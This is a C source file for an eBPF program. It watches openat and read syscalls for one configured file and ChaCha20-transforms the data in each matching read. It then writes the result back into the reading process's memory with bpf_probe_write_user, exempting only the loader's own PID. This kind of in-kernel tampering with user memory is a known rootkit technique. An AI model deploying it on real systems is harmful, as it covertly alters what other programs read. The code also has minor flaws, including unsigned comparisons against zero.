#include <vmlinux.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "main.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 256 * 1024);
	__type(key, u32);
	__type(value, u32);
} map_fds SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 256 * 1024);
	__type(key, u32);
	__type(value, u64);
} map_buf_addrs SEC(".maps");

struct chacha20_ctx {
	u32 state[16];
	u8 *data;
	u32 data_sz;
};

const volatile int loader_pid = 0;
const volatile int filename_len = 0;
const volatile char filename[MAX_FILENAME_LEN];

const volatile unsigned char key[32] = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
const volatile unsigned char nonce[12] = "bbbbbbbbbbbb";
const volatile unsigned int counter = 0;

static inline int chacha20_block(u32 out[16], u32 const in[16])
{
	u32 x[16];

	for (int i = 0; i < 16; ++i)
		x[i] = in[i];

	for (int i = 0; i < ROUNDS; i += 2) {
		QR(x[0], x[4], x[8], x[12]);
		QR(x[1], x[5], x[9], x[13]);
		QR(x[2], x[6], x[10], x[14]);
		QR(x[3], x[7], x[11], x[15]);

		QR(x[0], x[5], x[10], x[15]);
		QR(x[1], x[6], x[11], x[12]);
		QR(x[2], x[7], x[8], x[13]);
		QR(x[3], x[4], x[9], x[14]);
	}

	for (int i = 0; i < 16; ++i)
		out[i] = x[i] + in[i];

	return 0;
}

static inline void chacha20_init(u32 state[16], u8 key[32], u8 nonce[12], u32 counter)
{
	state[0] = 0x61707865;
	state[1] = 0x3320646E;
	state[2] = 0x79622D32;
	state[3] = 0x6B206574;

	for (int i = 0; i < 8; ++i)
		state[4 + i] = ((u32 *)key)[i];

	state[12] = counter;

	for (int i = 0; i < 3; ++i)
		state[13 + i] = ((u32 *)nonce)[i];
}

static int encrypt_block(u64 block_idx, struct chacha20_ctx *ctx)
{
	u8 buf[CHACHA20_BLOCK_SIZE];
	u8 keystream[CHACHA20_BLOCK_SIZE];

	u8 cur_block_sz = min(64, ctx->data_sz - block_idx * 64);

	chacha20_block((u32 *)keystream, ctx->state);

	bpf_probe_read_user(buf, cur_block_sz, ctx->data + block_idx * 64);

	for (int i = 0; i < cur_block_sz; ++i)
		buf[i] ^= keystream[i];

	/* bpf_probe_write_user(ctx->data, buf, cur_block_sz); */
	if (cur_block_sz == CHACHA20_BLOCK_SIZE) {
		bpf_probe_write_user(ctx->data, buf, CHACHA20_BLOCK_SIZE);
	} else {
		/* brainrot trick to work around bpf_probe_write_user only accepting a constant size */
		for (int i = 0; i < cur_block_sz; ++i)
			bpf_probe_write_user(ctx->data + i, buf + i, 1);
	}

	++ctx->state[12];

	return 0;
}

static inline int chacha20_docrypt_user(u8 *data, u32 size, u8 key[32], u8 nonce[12], u32 counter)
{
	struct chacha20_ctx ctx;

	ctx.data = data;
	ctx.data_sz = size;

	u32 blocks = (ctx.data_sz + 63) >> 6;

	chacha20_init(ctx.state, key, nonce, counter);
	bpf_loop(blocks, encrypt_block, &ctx, 0);

	return 0;
}

SEC("tp/syscalls/sys_enter_openat")
int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
{
	u32 pid = bpf_get_current_pid_tgid() >> 32;
	if (pid == loader_pid)
		return 0;

	char cur_filename[MAX_FILENAME_LEN];
	bpf_probe_read_user(cur_filename, filename_len, (char *)ctx->args[1]);

	for (int i = 0; i < filename_len; ++i) {
		if (filename[i] != cur_filename[i])
			return 0;
	}

	u32 zero = 0;
	bpf_map_update_elem(&map_fds, &pid, &zero, BPF_ANY);

	return 0;
}

SEC("tp/syscalls/sys_exit_openat")
int handle_openat_exit(struct trace_event_raw_sys_exit *ctx)
{
	u32 pid = bpf_get_current_pid_tgid() >> 32;
	u32 *check = bpf_map_lookup_elem(&map_fds, &pid);
	if (!check)
		return 0;

	u32 fd = ctx->ret;
	if (fd <= 0)
		return 0;

	bpf_map_update_elem(&map_fds, &pid, &fd, BPF_ANY);

	return 0;
}

SEC("tp/syscalls/sys_enter_read")
int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
{
	u32 pid = bpf_get_current_pid_tgid() >> 32;
	u32 *pfd = bpf_map_lookup_elem(&map_fds, &pid);
	if (!pfd)
		return 0;

	u32 fd = ctx->args[0];
	if (*pfd != fd)
		return 0;

	u64 buf_addr = ctx->args[1];

	bpf_map_update_elem(&map_buf_addrs, &pid, &buf_addr, BPF_ANY);

	return 0;
}

SEC("tp/syscalls/sys_exit_read")
int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
{
	u32 pid = bpf_get_current_pid_tgid() >> 32;
	u64 *pbuf_addr = bpf_map_lookup_elem(&map_buf_addrs, &pid);
	if (!pbuf_addr)
		return 0;

	u32 count = ctx->ret;
	if (count <= 0)
		return 0;

	u32 *pfd = bpf_map_lookup_elem(&map_fds, &pid);
	if (!pfd)
		return 0;

	bpf_printk("[exit read] pid: %d, fd: %d, buf_addr: %llx, count: %d, data: %s", pid, *pfd,
		   *pbuf_addr, count, *pbuf_addr);
	chacha20_docrypt_user((u8 *)*pbuf_addr, count, (u8 *)key, (u8 *)nonce, counter);

	return 0;
}
